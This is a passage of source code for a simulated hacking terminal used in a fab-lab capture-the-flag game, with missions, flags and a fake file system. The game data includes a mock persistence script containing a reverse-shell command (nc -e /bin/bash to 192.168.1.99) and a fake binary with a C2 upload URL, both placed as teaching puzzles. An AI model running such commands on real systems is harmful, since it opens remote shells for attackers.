"use client";

import React, { useState, useEffect, useRef } from 'react';
import { Box, Typography, TextField, Alert, Snackbar } from '@mui/material';
import { useSession } from 'next-auth/react';
import useMediaQuery from '@mui/material/useMediaQuery';
import { useTheme } from '@mui/material/styles';

const INITIAL_OUTPUT = [
  "Welcome to The Lab Terminal v1.0.0",
  "Type 'help' to see available commands.",
  "------------------------------------"
];

const BASE_FILE_SYSTEM = {
  '~': {
    type: 'dir',
    children: {
      'readme.txt': { type: 'file', content: "Welcome to the Lab's mainframe. Your mission is to find the hidden flags scattered throughout this system.\n\nHere is a freebie to get you started: flag{welcome_to_the_lab}\n\nGood luck, hacker." },
      '.env': { type: 'file', content: "DB_HOST=localhost\nDB_USER=admin\nDB_PASS=password123\n# SYSTEM_FLAG=flag{hack_the_planet}" },
      '.bashrc': { type: 'file', content: "export PATH=$PATH:/bin:/usr/bin\nalias ll='ls -la'\n# TODO: Remove debug flags from env" },
      'projects': {
        type: 'dir',
        children: {
          'secret_plans.txt': { type: 'file', content: "Project Alpha: 3D print a full-size car.\nProject Beta: Laser cut a sandwich.\nProject Omega: flag{curiosity_killed_the_cat_but_satisfaction_brought_it_back}" },
          'alpha_protocol.md': { type: 'file', content: "# Alpha Protocol\n\nStatus: ON HOLD\nReason: Insufficient power supply." },
          'legacy_code': {
            type: 'dir',
            children: {
              'v1_backup.js': { type: 'file', content: "// Deprecated code\n// Do not use" },
              'notes.txt': { type: 'file', content: "Remember to update the dependencies." }
            }
          }
        }
      },
      'inbox': {
        type: 'dir',
        children: {
          'welcome.msg': { type: 'file', content: "From: Shyft (President)\nSubject: Welcome\n\nWelcome to the team. I'm Shyft, the President and lead pen-tester here.\nTake a look around, but don't touch anything important.\n\n- Shyft" }
        }
      },
      'logs': {
        type: 'dir',
        children: {
          'system.log': { type: 'file', content: "[INFO] System boot...\n[WARN] Unauthorized access detected...\n[ERROR] Coffee levels critical." },
          'access.log': { type: 'file', content: "192.168.1.10 - - [27/Dec/2025:10:00:00 +0000] \"GET /index.html HTTP/1.1\" 200 1024\n192.168.1.11 - - [27/Dec/2025:10:01:00 +0000] \"POST /login HTTP/1.1\" 401 512" },
          'error.log': { type: 'file', content: "[ERROR] Connection timed out\n[ERROR] File not found" }
        }
      },
      'documents': {
        type: 'dir',
        children: {
          'todo.txt': { type: 'file', content: "1. Fix bugs\n2. Drink coffee\n3. Hack the planet\n4. Buy milk" },
          'meeting_notes.txt': { type: 'file', content: "Meeting with the team.\nDiscussed the new security protocols.\nNeed to rotate keys every 30 days." },
          'chat_log.txt': { type: 'file', content: "[IRC LOG - #general]\n<Shyft> We need to talk to the Treasurer about the budget.\n<MoonCaptain> Good luck. 0xb007ab1e is in 'deep focus' mode.\n<CritterCodes> Does that mean he's speaking in hex again?\n<Shyft> Always. He puts '0x' in front of everything. Even his lunch order.\n<MoonCaptain> It's his signature style. He thinks it makes 'Bootable' look cooler.\n<CritterCodes> I bet his password is still just his name backwards. He's so predictable." },
          'recipes': {
            type: 'dir',
            children: {
              'coffee.txt': { type: 'file', content: "1. Grind beans\n2. Boil water\n3. Pour over\n4. Enjoy" }
            }
          }
        }
      },
      'downloads': {
        type: 'dir',
        children: {
          'installer.sh': { type: 'file', content: "#!/bin/bash\necho 'Installing...'" },
          'manual.pdf': { type: 'file', content: "[PDF CONTENT ENCRYPTED]" }
        }
      }
    }
  },
  'bin': {
    type: 'dir',
    children: {
      'ls': { type: 'file', content: "Binary file" },
      'cd': { type: 'file', content: "Binary file" },
      'cat': { type: 'file', content: "Binary file" },
      'whoami': { type: 'file', content: "Binary file" },
      'submit': { type: 'file', content: "Binary file" },
      'help': { type: 'file', content: "Binary file" },
      'mkdir': { type: 'file', content: "Binary file" },
      'touch': { type: 'file', content: "Binary file" },
      'rm': { type: 'file', content: "Binary file" },
      'pwd': { type: 'file', content: "Binary file" },
      'ledger': { type: 'file', content: "Binary file" },
      'grep': { type: 'file', content: "Binary file" },
      'curl': { type: 'file', content: "Binary file" },
      'crack': { type: 'file', content: "Binary file" },
      'unzip': { type: 'file', content: "Binary file" },
      'mission': { type: 'file', content: "Binary file" }
    }
  },
  'etc': {
    type: 'dir',
    children: {
      'hosts': { type: 'file', content: "127.0.0.1 localhost\n192.168.1.1 router\n10.0.0.5 printer_farm\n10.0.0.6 laser_cutter" },
      'resolv.conf': { type: 'file', content: "nameserver 8.8.8.8" },
      'motd': { type: 'file', content: "Welcome to The Lab Mainframe.\nAuthorized personnel only.\n\n\"We do what we must because we can.\"" },
      'passwd': { type: 'file', content: "root:x:0:0:root:/root:/bin/bash\nguest:x:1000:1000:guest:/home/guest:/bin/bash\nshyft:x:1001:1001:Shyft:/home/shyft:/bin/bash\ncrittercodes:x:1002:1002:CritterCodes:/home/crittercodes:/bin/bash\nmooncaptain:x:1003:1003:Moon Captain:/home/mooncaptain:/bin/bash\n0xb007ab1e:x:1004:1004:0xb007ab1e:/home/0xb007ab1e:/bin/bash" },
      'shadow': { type: 'file', content: "root:$6$hG7s9...:18000:0:99999:7:::\nguest:*:18000:0:99999:7:::\nshyft:$1$5231a$7823...:18000:0:99999:7:::" },
      'group': { type: 'file', content: "root:x:0:\nguest:x:1000:\nboard:x:1001:shyft,crittercodes,mooncaptain,0xb007ab1e" },
      'fablab.conf': { type: 'file', content: "# Fab Lab System Configuration\n\n[General]\nLabName=The Lab\nLocation=ACHE Building\n\n[Network]\nSSID=FabLab_Secure\n\n[Database]\n# Connection string corrupted. Please restore." }
    }
  },
  'var': {
    type: 'dir',
    children: {
      'log': {
        type: 'dir',
        children: {
          'auth.log': { type: 'file', content: "Dec 27 10:00:01 server sshd[1234]: Accepted password for user admin from 192.168.1.50 port 22 ssh2\nDec 27 10:05:23 server sudo: pam_unix(sudo:auth): conversation failed" },
          'syslog': { type: 'file', content: "Dec 27 09:00:00 server systemd[1]: Started System Logging Service." },
          'kern.log': { type: 'file', content: "Dec 27 08:59:59 server kernel: [    0.000000] Linux version 5.4.0-42-generic" },
          'dmesg': { type: 'file', content: "[    0.000000] Initializing cgroup subsys cpuset\n[    0.000000] Initializing cgroup subsys cpu" }
        }
      },
      'www': {
        type: 'dir',
        children: {
          'html': {
            type: 'dir',
            children: {
              'index.html': { type: 'file', content: "<html>\n<head><title>Fab Lab Member Portal</title></head>\n<body>\n<h1>Welcome to the Fab Lab</h1>\n<p>Status: Systems Offline. Maintenance Required.</p>\n<!-- TODO: Restore database connection in /etc/fablab.conf -->\n</body>\n</html>" }
            }
          }
        }
      },
      'backups': {
        type: 'dir',
        children: {
            'secure_data.zip': { type: 'file', content: "[ENCRYPTED ARCHIVE]\nContains:\n- history.txt\n- community.txt\n- board_minutes.txt" },
            'site_backup.tar.gz': { type: 'file', content: "[BINARY DATA]" }
        }
      }
    }
  },
  'usr': {
    type: 'dir',
    children: {
      'local': {
        type: 'dir',
        children: {
          'bin': { type: 'dir', children: {} },
          'share': { type: 'dir', children: {} }
        }
      },
      'share': {
        type: 'dir',
        children: {
            'dict': {
                type: 'dir',
                children: {
                    'words': { type: 'file', content: "hack\nphreak\nmake\nbuild\ncode\n..." }
                }
            }
        }
      }
    }
  },
  'tmp': {
    type: 'dir',
    children: {
      'cache.tmp': { type: 'file', content: "0xDEADBEEF" },
      'session.lock': { type: 'file', content: "PID: 1337" }
    }
  }
};

const MISSION_1_FLAGS = [
  "flag{welcome_to_the_lab}",
  "flag{curiosity_killed_the_cat_but_satisfaction_brought_it_back}",
  "flag{hack_the_planet}"
];

const MISSION_2_FLAGS = ["flag{protocol_override_initiated}"];
const MISSION_3_FLAGS = ["flag{system_restoration_imminent}"];
const MISSION_4_FLAGS = ["flag{internal_network_mapped}"];
const MISSION_5_FLAGS = [
  "flag{ache_building_legacy}",
  "flag{shell_on_the_border_forever}",
  "flag{admin_access_granted}"
];

const MISSION_6_FLAGS = ["flag{follow_the_money_trail}"];
const MISSION_7_FLAGS = ["flag{api_backdoor_discovered}"];
const MISSION_8_FLAGS = ["flag{logic_bomb_defused}"];
const MISSION_9_FLAGS = ["flag{c2_server_identified}"];
const MISSION_10_FLAGS = ["flag{system_hardened_ghost_busted}"];
const BONUS_FLAGS = ["flag{devs_are_watching}"];

export default function TerminalPage() {
  const { data: session } = useSession();
  const [history, setHistory] = useState(INITIAL_OUTPUT);
  const [input, setInput] = useState('');
  const [currentPath, setCurrentPath] = useState(['~']);
  const [commandHistory, setCommandHistory] = useState([]);
  const [historyIndex, setHistoryIndex] = useState(-1);
  const [fileSystem, setFileSystem] = useState(BASE_FILE_SYSTEM);
  const [missionLevel, setMissionLevel] = useState(1);
  const [stakeHistory, setStakeHistory] = useState([]);
  const [capturedFlags, setCapturedFlags] = useState([]);
  const [terminalUser, setTerminalUser] = useState('guest');
  const [awaitingPassword, setAwaitingPassword] = useState(null);
  const bottomRef = useRef(null);
  
  const theme = useTheme();
  const isMobile = useMediaQuery(theme.breakpoints.down('md'));
  const [showMobileWarning, setShowMobileWarning] = useState(false);

  useEffect(() => {
    if (isMobile) {
      setShowMobileWarning(true);
    }
  }, [isMobile]);

  useEffect(() => {
    bottomRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [history]);

  // Sync terminal user with session user on load
  useEffect(() => {
    if (session?.user?.username) {
        setTerminalUser(prev => prev === 'guest' ? session.user.username : prev);
    }
  }, [session]);

  // Fetch user state on load
  useEffect(() => {
    const fetchState = async () => {
      try {
        const res = await fetch('/api/v1/terminal/state');
        if (res.ok) {
          const data = await res.json();
          const captured = data.capturedFlags || [];
          setCapturedFlags(captured);
          setStakeHistory(data.stakeHistory || []);
          
          // Check Mission Progress
          const mission1Complete = MISSION_1_FLAGS.every(f => captured.includes(f));
          const mission2Complete = MISSION_2_FLAGS.every(f => captured.includes(f));
          const mission3Complete = MISSION_3_FLAGS.every(f => captured.includes(f));
          const mission4Complete = MISSION_4_FLAGS.every(f => captured.includes(f));
          const mission5Complete = MISSION_5_FLAGS.every(f => captured.includes(f));
          const mission6Complete = MISSION_6_FLAGS.every(f => captured.includes(f));
          const mission7Complete = MISSION_7_FLAGS.every(f => captured.includes(f));
          const mission8Complete = MISSION_8_FLAGS.every(f => captured.includes(f));
          const mission9Complete = MISSION_9_FLAGS.every(f => captured.includes(f));
          const mission10Complete = MISSION_10_FLAGS.every(f => captured.includes(f));
          
          if (mission10Complete && mission9Complete && mission8Complete && mission7Complete && mission6Complete && mission5Complete && mission4Complete && mission3Complete && mission2Complete && mission1Complete) {
             setMissionLevel(11); // Game Over / Free Play
             unlockMission2();
             unlockMission3();
             unlockMission4();
             unlockMission5();
             unlockMission6();
             unlockMission7();
             unlockMission8();
             unlockMission9();
             unlockMission10();
          } else if (mission9Complete && mission8Complete && mission7Complete && mission6Complete && mission5Complete && mission4Complete && mission3Complete && mission2Complete && mission1Complete) {
             setMissionLevel(10);
             unlockMission2();
             unlockMission3();
             unlockMission4();
             unlockMission5();
             unlockMission6();
             unlockMission7();
             unlockMission8();
             unlockMission9();
             unlockMission10();
          } else if (mission8Complete && mission7Complete && mission6Complete && mission5Complete && mission4Complete && mission3Complete && mission2Complete && mission1Complete) {
             setMissionLevel(9);
             unlockMission2();
             unlockMission3();
             unlockMission4();
             unlockMission5();
             unlockMission6();
             unlockMission7();
             unlockMission8();
             unlockMission9();
          } else if (mission7Complete && mission6Complete && mission5Complete && mission4Complete && mission3Complete && mission2Complete && mission1Complete) {
             setMissionLevel(8);
             unlockMission2();
             unlockMission3();
             unlockMission4();
             unlockMission5();
             unlockMission6();
             unlockMission7();
             unlockMission8();
          } else if (mission6Complete && mission5Complete && mission4Complete && mission3Complete && mission2Complete && mission1Complete) {
             setMissionLevel(7);
             unlockMission2();
             unlockMission3();
             unlockMission4();
             unlockMission5();
             unlockMission6();
             unlockMission7();
          } else if (mission5Complete && mission4Complete && mission3Complete && mission2Complete && mission1Complete) {
             setMissionLevel(6);
             unlockMission2();
             unlockMission3();
             unlockMission4();
             unlockMission5();
             unlockMission6();
          } else if (mission4Complete && mission3Complete && mission2Complete && mission1Complete) {
             setMissionLevel(5);
             unlockMission2();
             unlockMission3();
             unlockMission4();
             unlockMission5();
          } else if (mission3Complete && mission2Complete && mission1Complete) {
             setMissionLevel(4);
             unlockMission2();
             unlockMission3();
             unlockMission4();
          } else if (mission2Complete && mission1Complete) {
             setMissionLevel(3);
             unlockMission2();
             unlockMission3();
          } else if (mission1Complete) {
            setMissionLevel(2);
            unlockMission2();
          }
        }
      } catch (error) {
        console.error("Failed to fetch terminal state", error);
      }
    };
    if (session) {
      fetchState();
    }
  }, [session]);

  const unlockMission2 = () => {
    setFileSystem(prev => {
      const newFS = JSON.parse(JSON.stringify(prev)); // Deep copy
      
      // Ensure missions directory exists
      if (newFS['~'] && newFS['~'].children) {
        if (!newFS['~'].children['missions']) {
            newFS['~'].children['missions'] = { type: 'dir', children: {} };
        }
        
        // Add Mission 2 files
        newFS['~'].children['missions'].children['operation_blackout'] = {
          type: 'dir',
          children: {
            'briefing.txt': { type: 'file', content: "MISSION BRIEFING:\n\nAgent, we have detected a rogue protocol initiating a system lockout. We need you to decrypt the payload file to override the sequence.\n\nThe encryption key was last seen in the authentication logs before the admin wiped them. Dig deep." },
            'payload.enc': { type: 'file', content: "ENCRYPTED DATA. USE 'decrypt <file> <key>' TO DECRYPT." }
          }
        };

        // Add Mission 1 Log
        newFS['~'].children['missions'].children['mission_1_log.txt'] = {
            type: 'file',
            content: "MISSION 1 LOG: INITIAL ACCESS\n-----------------------------\nSTATUS: COMPLETE\n\nUser successfully breached perimeter security.\nFlags captured: 3/3\nAccess Level: ELEVATED"
        };

        // Add Inbox Message
        if (newFS['~'].children['inbox']) {
            newFS['~'].children['inbox'].children['email_01.txt'] = {
                type: 'file',
                content: "From: Shyft (President)\nSubject: ALERT: System Lockout Imminent\n\nWarning: Multiple failed login attempts detected on the admin account.\nAutomated lockout protocol 'Operation Blackout' has been triggered.\n\nI'm locked out of the main console. Check the auth logs immediately."
            };
        }
      }

      // Add the key to auth.log
      if (newFS['var'] && newFS['var'].children['log'] && newFS['var'].children['log'].children['auth.log']) {
        if (!newFS['var'].children['log'].children['auth.log'].content.includes("KEY_GENERATED")) {
             newFS['var'].children['log'].children['auth.log'].content += "\nDec 27 10:10:05 server sshd[1234]: Failed password for user admin from 192.168.1.50 port 22 ssh2\nDec 27 10:10:10 server root: KEY_GENERATED: super_secret_admin_key_99";
        }
      }

      return newFS;
    });
  };

  const unlockMission3 = () => {
      setFileSystem(prev => {
          const newFS = JSON.parse(JSON.stringify(prev));
          
          // Ensure missions directory exists
          if (newFS['~'] && newFS['~'].children) {
            if (!newFS['~'].children['missions']) {
                newFS['~'].children['missions'] = { type: 'dir', children: {} };
            }
            // Add Mission 2 Log
            newFS['~'].children['missions'].children['mission_2_log.txt'] = {
                type: 'file',
                content: "MISSION 2 LOG: OPERATION BLACKOUT\n---------------------------------\nSTATUS: COMPLETE\n\nPayload decrypted successfully.\nLockout override sequence initiated.\nRoot access restored."
            };
            
            // Add Inbox Message
            if (newFS['~'].children['inbox']) {
                newFS['~'].children['inbox'].children['email_02.txt'] = {
                    type: 'file',
                    content: "From: 0xb007ab1e (Treasurer)\nSubject: CRITICAL: Database Connection Lost\n\nThe main database is not responding. The configuration file seems to be corrupted or missing.\nWe need to restore the system ASAP. Check /usr/local/bin for any recovery tools.\n\nNote: You'll probably need root access to run the recovery script. Use the key you found in the logs."
                };
            }
          }

          // Add Mission 3 files
          if (newFS['usr'] && newFS['usr'].children['local'] && newFS['usr'].children['local'].children['bin']) {
              newFS['usr'].children['local'].children['bin'].children['restore_system.sh'] = {
                  type: 'file',
                  content: "#!/bin/bash\n# SYSTEM RESTORATION SCRIPT\n# Usage: ./restore_system.sh\n\necho 'Restoring Fab Lab Systems...'\necho 'Connecting to database...'\necho 'Error: Database configuration missing in /etc/fablab.conf'\n# TODO: Find the backup config and restore it."
              };
          }
          
          // Add a backup config somewhere hidden
          if (newFS['var'] && newFS['var'].children['backups']) {
              newFS['var'].children['backups'].children['config_backup.old'] = {
                  type: 'file',
                  content: "[Database]\nConnectionString=mongodb://admin:secure_password_2025@localhost:27017/fablab\n\n# FLAG: flag{system_restoration_imminent}"
              };
          }

          return newFS;
      });
  };

  const unlockMission4 = () => {
      setFileSystem(prev => {
          const newFS = JSON.parse(JSON.stringify(prev));
          if (newFS['~'] && newFS['~'].children) {
            if (!newFS['~'].children['missions']) {
                newFS['~'].children['missions'] = { type: 'dir', children: {} };
            }
            newFS['~'].children['missions'].children['mission_3_log.txt'] = {
                type: 'file',
                content: "MISSION 3 LOG: SYSTEM RESTORATION\n---------------------------------\nSTATUS: COMPLETE\n\nDatabase configuration restored.\nSystems online.\nNetwork monitoring tools unlocked."
            };

            // Add Inbox Message
            if (newFS['~'].children['inbox']) {
                newFS['~'].children['inbox'].children['email_03.txt'] = {
                    type: 'file',
                    content: "From: Moon Captain (Secretary)\nSubject: Suspicious Activity Detected\n\nWe are seeing strange traffic on the internal network. Some devices are behaving erratically.\nI need you to map the network and identify any vulnerable hosts.\n\nUse 'curl' to scan the internal IP range (10.0.0.x)."
                };
            }
          }
          return newFS;
      });
  };

  const unlockMission5 = () => {
      setFileSystem(prev => {
          const newFS = JSON.parse(JSON.stringify(prev));

            // Add Inbox Message
            if (newFS['~'].children['inbox']) {
                newFS['~'].children['inbox'].children['email_04.txt'] = {
                    type: 'file',
                    content: "From: CritterCodes (CEO)\nSubject: Secure Archives\n\nGreat work on the network. Now we need to secure our legacy data.\nWe have some sensitive documents in the secure backup archive (/var/backups/secure_data.zip).\n\nThe password was lost, but I recall Shyft used a simple dictionary word.\nYou might find the password hash in the shadow file. Crack it."
                };
            }
          if (newFS['~'] && newFS['~'].children) {
            if (!newFS['~'].children['missions']) {
                newFS['~'].children['missions'] = { type: 'dir', children: {} };
            }
            newFS['~'].children['missions'].children['mission_4_log.txt'] = {
                type: 'file',
                content: "MISSION 4 LOG: NETWORK DISCOVERY\n--------------------------------\nSTATUS: COMPLETE\n\nInternal network mapped.\nPrinter farm control node identified.\nSuspicious traffic analysis complete."
            };
          }
          return newFS;
      });
  };

  const unlockMission6 = () => {
      setFileSystem(prev => {
          const newFS = JSON.parse(JSON.stringify(prev));
          
          // Add Mission 5 Log
          if (newFS['~'] && newFS['~'].children) {
            if (!newFS['~'].children['missions']) {
                newFS['~'].children['missions'] = { type: 'dir', children: {} };
            }
            newFS['~'].children['missions'].children['mission_5_log.txt'] = {
                type: 'file',
                content: "MISSION 5 LOG: INFORMATION GATHERING\n------------------------------------\nSTATUS: COMPLETE\n\nLegacy data fragments recovered.\nHistorical context established.\nThe Lab is safe."
            };

            // Add Inbox Message
            if (newFS['~'].children['inbox']) {
                newFS['~'].children['inbox'].children['email_05.txt'] = {
                    type: 'file',
                    content: "From: Shyft (President)\nSubject: URGENT: Treasurer Missing\n\n0xb007ab1e has gone silent. We've noticed some irregularities in the accounts.\nI need you to access their personal ledger to see where the money is going.\n\nThe problem is, their home directory is locked. You'll need to switch users ('su').\nI recall them bragging that their password was just their username in reverse leetspeak or something simple like that.\n\nGood luck."
                };
            }
          }

          // Create /home directory structure if not exists (simulated)
          // We will add 'home' to the root of fileSystem
          if (!newFS['home']) {
              newFS['home'] = {
                  type: 'dir',
                  children: {
                      '0xb007ab1e': {
                          type: 'dir',
                          owner: '0xb007ab1e',
                          children: {
                              'ledger.dat': {
                                  type: 'file',
                                  content: "TRANSACTION LOG - CONFIDENTIAL\n------------------------------\n2025-12-01 | -5000 | PROJECT_NEMESIS_HARDWARE\n2025-12-05 | -2000 | SERVER_FARM_RENTAL\n2025-12-10 | -1000 | OFFSHORE_ACCOUNT_77\n\nFLAG: flag{follow_the_money_trail}"
                              },
                              'notes.txt': {
                                  type: 'file',
                                  content: "To do: Delete this ledger before the audit."
                              }
                          }
                      }
                  }
              };
          }

          return newFS;
      });
  };

  const unlockMission7 = () => {
      setFileSystem(prev => {
          const newFS = JSON.parse(JSON.stringify(prev));
          
          if (newFS['~'] && newFS['~'].children) {
            if (!newFS['~'].children['missions']) {
                newFS['~'].children['missions'] = { type: 'dir', children: {} };
            }
            newFS['~'].children['missions'].children['mission_6_log.txt'] = {
                type: 'file',
                content: "MISSION 6 LOG: PRIVILEGE ESCALATION\n-----------------------------------\nSTATUS: COMPLETE\n\nTreasurer's ledger accessed.\nUnauthorized transactions confirmed.\nTarget: PROJECT_NEMESIS."
            };

            // Add Inbox Message
            if (newFS['~'].children['inbox']) {
                newFS['~'].children['inbox'].children['email_06.txt'] = {
                    type: 'file',
                    content: "From: CritterCodes (CEO)\nSubject: The Backdoor\n\nThe ledger confirms it. Someone is funneling money to 'Project Nemesis'.\nBut how are they controlling the system? I suspect they left a backdoor in the web server.\n\nWe suspect a misconfiguration in the web server. Check the site configuration files in /etc/nginx/.\nIf you find an endpoint, try to hit it with a POST request."
                };
            }
          }

          // Add Nginx Config
          if (newFS['etc']) {
              if (!newFS['etc'].children) newFS['etc'].children = {};
              if (!newFS['etc'].children['nginx']) newFS['etc'].children['nginx'] = { type: 'dir', children: {} };
              if (!newFS['etc'].children['nginx'].children['sites-available']) newFS['etc'].children['nginx'].children['sites-available'] = { type: 'dir', children: {} };
              
              newFS['etc'].children['nginx'].children['sites-available'].children['fablab'] = {
                  type: 'file',
                  content: "server {\n    listen 80;\n    server_name www.fablabfortsmith.org;\n\n    location / {\n        root /var/www/html;\n        index index.html;\n    }\n\n    # DEBUG ENDPOINT - REMOVE IN PROD\n    location /api/debug {\n        allow all;\n    }\n}"
              };
          }

          // Update index.html (remove the explicit comment to make it harder)
          if (newFS['var'] && newFS['var'].children['www'] && newFS['var'].children['www'].children['html']) {
              newFS['var'].children['www'].children['html'].children['index.html'] = {
                  type: 'file',
                  content: "<html>\n<head><title>Fab Lab Member Portal</title></head>\n<body>\n<h1>Welcome to the Fab Lab</h1>\n<p>Status: Systems Online.</p>\n</body>\n</html>"
              };
          }

          return newFS;
      });
  };

  const unlockMission8 = () => {
      setFileSystem(prev => {
          const newFS = JSON.parse(JSON.stringify(prev));
          
          if (newFS['~'] && newFS['~'].children) {
            if (!newFS['~'].children['missions']) {
                newFS['~'].children['missions'] = { type: 'dir', children: {} };
            }
            newFS['~'].children['missions'].children['mission_7_log.txt'] = {
                type: 'file',
                content: "MISSION 7 LOG: WEB SECURITY\n---------------------------\nSTATUS: COMPLETE\n\nBackdoor identified and closed.\nAttacker IP traced to internal subnet.\nThey are still in the system."
            };

            // Add Inbox Message
            if (newFS['~'].children['inbox']) {
                newFS['~'].children['inbox'].children['email_07.txt'] = {
                    type: 'file',
                    content: "From: Moon Captain (Secretary)\nSubject: SYSTEM CRITICAL: High CPU Usage\n\nSomething is wrong. The servers are slowing down to a crawl.\nI think the attacker triggered a dead man's switch when you closed the backdoor.\n\nSystem resources are being drained. Identify the rogue process and terminate it.\nConsult the manual ('help ps') if you don't know how to find hidden processes.\nHurry!"
                };
            }
          }
          return newFS;
      });
  };

  const unlockMission9 = () => {
      setFileSystem(prev => {
          const newFS = JSON.parse(JSON.stringify(prev));
          
          if (newFS['~'] && newFS['~'].children) {
            if (!newFS['~'].children['missions']) {
                newFS['~'].children['missions'] = { type: 'dir', children: {} };
            }
            newFS['~'].children['missions'].children['mission_8_log.txt'] = {
                type: 'file',
                content: "MISSION 8 LOG: PROCESS FORENSICS\n--------------------------------\nSTATUS: COMPLETE\n\nMalicious process terminated.\nSystem stability restored.\nBinary captured for analysis."
            };

            // Add Inbox Message
            if (newFS['~'].children['inbox']) {
                newFS['~'].children['inbox'].children['email_08.txt'] = {
                    type: 'file',
                    content: "From: Shyft (President)\nSubject: Analyze the Payload\n\nGood kill on that process. We managed to capture the binary before it deleted itself.\nIt's sitting in /tmp/nemesis.\n\nWe need to know where it was sending our data. Analyze the binary and find the destination server.\n\nIt's a compiled binary, so you'll need the right tool to see what's inside."
                };
            }
          }

          // Add binary to /tmp
          if (!newFS['tmp']) {
              newFS['tmp'] = { type: 'dir', children: {} };
          }
          if (!newFS['tmp'].children) newFS['tmp'].children = {};
          
          const nemesisFile = {
                  type: 'file',
                  content: "ELF\u0002\u0001\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0002\u0000>\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000" +
                           "libc.so.6\nprintf\nsocket\nconnect\n" +
                           "http://192.168.1.99/c2/upload\n" +
                           "flag{c2_server_identified}\n" +
                           "GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0\n" +
                           "crtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux"
          };

          newFS['tmp'].children['nemesis'] = nemesisFile;

          return newFS;
      });
  };

  const unlockMission10 = () => {
      setFileSystem(prev => {
          const newFS = JSON.parse(JSON.stringify(prev));
          
          if (newFS['~'] && newFS['~'].children) {
            if (!newFS['~'].children['missions']) {
                newFS['~'].children['missions'] = { type: 'dir', children: {} };
            }
            newFS['~'].children['missions'].children['mission_9_log.txt'] = {
                type: 'file',
                content: "MISSION 9 LOG: BINARY ANALYSIS\n------------------------------\nSTATUS: COMPLETE\n\nC2 Server Identified: 192.168.1.99\nPayload analyzed.\nWe are ready for the final cleanup."
            };

            // Add Inbox Message
            if (newFS['~'].children['inbox']) {
                newFS['~'].children['inbox'].children['email_09.txt'] = {
                    type: 'file',
                    content: "From: CritterCodes (CEO)\nSubject: FINAL ALERT: Persistent Threat\n\nThe attacker is trying to get back in. We detected a persistent connection attempt every time the server reboots.\nIt must be a startup script. Find it and neutralize it.\n\nCheck the standard startup directories. If you find anything suspicious, either delete it ('rm') or remove all permissions ('chmod 000').\n\nThese are system files, so you'll need root access. I trust you remember how to get that by now.\nLock them out for good."
                };
            }
          }

          // Add malicious startup script and decoys
          if (newFS['etc']) {
              if (!newFS['etc'].children) newFS['etc'].children = {};
              if (!newFS['etc'].children['init.d']) newFS['etc'].children['init.d'] = { type: 'dir', children: {} };
              
              const initD = newFS['etc'].children['init.d'].children;

              initD['S01networking'] = {
                  type: 'file',
                  content: "#!/bin/bash\n# Network initialization\nifup -a",
                  permissions: '755',
                  owner: 'root'
              };

              initD['S02ssh'] = {
                  type: 'file',
                  content: "#!/bin/bash\n# SSH Server\n/usr/sbin/sshd",
                  permissions: '755',
                  owner: 'root'
              };

              initD['S98cron'] = {
                  type: 'file',
                  content: "#!/bin/bash\n# Cron Daemon\n/usr/sbin/cron",
                  permissions: '755',
                  owner: 'root'
              };
              
              initD['S99update_check'] = {
                  type: 'file',
                  content: "#!/bin/bash\n# System Update Check\nwhile true; do nc -e /bin/bash 192.168.1.99 4444; done",
                  permissions: '755',
                  owner: 'root'
              };
          }

          return newFS;
      });
  };

  const getDirectory = (path) => {
    if (path.length === 0) return fileSystem;

    let current = fileSystem['~'];
    
    // Handle root path access for non-home directories
    if (path[0] !== '~') {
       current = fileSystem;
       for (let i = 0; i < path.length; i++) {
         if (current[path[i]]) {
            current = current[path[i]];
         } else if (current.children && current.children[path[i]]) {
            current = current.children[path[i]];
         } else {
            return null;
         }
       }
       return current;
    }

    // Handle home directory
    for (let i = 1; i < path.length; i++) {
      if (current.children && current.children[path[i]]) {
        current = current.children[path[i]];
      } else {
        return null;
      }
    }
    return current;
  };

  const executeScript = async (filename, content) => {
      const lines = content.split('\n');
      for (const line of lines) {
          const trimmed = line.trim();
          if (!trimmed || trimmed.startsWith('#')) continue;
          
          if (trimmed.startsWith('echo ')) {
              const message = trimmed.substring(5).replace(/^['"]|['"]$/g, '');
              setHistory(prev => [...prev, message]);
              await new Promise(r => setTimeout(r, 500)); // Delay for effect
          }
      }

      // Special Logic for restore_system.sh
      if (filename === 'restore_system.sh') {
          if (terminalUser !== 'root') {
              setHistory(prev => [...prev, "Access Denied: This script requires root privileges.", "Please switch to the root user ('su root') and try again."]);
              return;
          }

          if (capturedFlags.includes(MISSION_3_FLAGS[0])) {
              setHistory(prev => [...prev, "SUCCESS: Database connection restored.", "System Status: ONLINE"]);
              // Trigger mission completion if not already
              if (missionLevel === 3) {
                  handleCommand('submit ' + MISSION_3_FLAGS[0]); // Auto-submit or just trigger logic? 
                  // Better to just let them submit the flag manually to get the reward, 
                  // but we can show a success message here.
              }
          } else {
              // Fail state is already printed by the echo commands in the file
          }
      }
  };

  const executeChmod = (mode, targetPath, user) => {
      const messages = [];
      
      // Resolve path
      let pathStack = [];
      let filename = targetPath;
      
      if (targetPath.includes('/')) {
          const parts = targetPath.split('/');
          filename = parts.pop();
          
          if (targetPath.startsWith('/')) {
              pathStack = []; // Root
          } else if (targetPath.startsWith('~/')) {
              pathStack = ['~'];
          } else {
              pathStack = [...currentPath];
          }
          
          const dirParts = parts.filter(p => p && p !== '.' && p !== '~');
          for (const part of dirParts) {
              if (part === '..') {
                  if (pathStack.length > 0) pathStack.pop();
              } else {
                  pathStack.push(part);
              }
          }
      } else {
          pathStack = [...currentPath];
      }

      const dir = getDirectory(pathStack);
      if (dir && dir.children && dir.children[filename]) {
          const file = dir.children[filename];
          
          // Permission check (must be root or owner)
          if (user !== 'root' && file.owner !== user) {
              messages.push(`chmod: changing permissions of '${targetPath}': Operation not permitted`);
              return messages;
          }

          // Update permissions
          setFileSystem(prev => {
              const newFS = JSON.parse(JSON.stringify(prev));
              let current = newFS;
              if (pathStack.length > 0 && pathStack[0] === '~') {
                  current = newFS['~'];
                  for (let i = 1; i < pathStack.length; i++) {
                      current = current.children[pathStack[i]];
                  }
              } else {
                  for (let i = 0; i < pathStack.length; i++) {
                       if (current[pathStack[i]]) current = current[pathStack[i]];
                       else if (current.children && current.children[pathStack[i]]) current = current.children[pathStack[i]];
                  }
              }

              if (current && current.children && current.children[filename]) {
                  current.children[filename].permissions = mode;
              }
              return newFS;
          });
